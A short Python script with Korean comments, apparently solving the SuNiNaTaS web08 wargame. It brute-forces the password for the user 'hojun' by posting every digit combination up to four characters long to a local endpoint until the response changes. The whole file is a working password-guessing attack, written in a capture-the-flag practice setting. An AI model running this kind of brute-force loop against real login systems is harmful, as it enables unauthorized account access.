import requests
import itertools

# http://suninatas.com/challenge/web08/web08.asp
# burp suite으로 하면 확실하지만, 개발자 도구 - settings - network에서 preserve log 체크
# 문자열 = 'abcdefghijklmnopqrstuvwxyz0123456789'  # 특수 문자는 없다고 가정한다
문자열 = '0123456789'  # 특수 문자는 없다고 가정한다

for 패스워드길이 in range(1, 5):  # 1 - 1~3에서 1~5까지 해볼 것
    for password in itertools.product(문자열, repeat=패스워드길이):
        # print(password)  # 1
        # print(''.join(password))
        pw = ''.join(password)
        print(pw)
        로그인패킷 = {
            'id': 'hojun',
            'pw': pw,
        }
        address = requests.post('http://127.0.0.1:8080/', data=로그인패킷)
        if address.text.find('login') > 0:
            exit()
